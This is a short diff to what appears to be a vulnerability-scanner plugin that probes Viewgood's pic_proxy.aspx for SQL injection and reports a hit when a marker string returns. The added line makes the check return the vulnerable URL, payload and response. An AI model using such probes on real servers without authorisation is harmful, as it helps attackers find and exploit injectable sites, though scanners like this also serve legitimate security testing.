@@ -25,6 +25,7 @@ class viewgood_pic_proxy_sqli_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"tyqMicrosoft" in req.text:
                 cprint("[+]存在远古 pic_proxy.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "远古 pic_proxy.aspx SQL注入", str(payload), req.text
             else:
                 cprint("[-]不存在viewgood_pic_proxy_sqli漏洞", "white", "on_grey")
                 return False, None, None, None, None
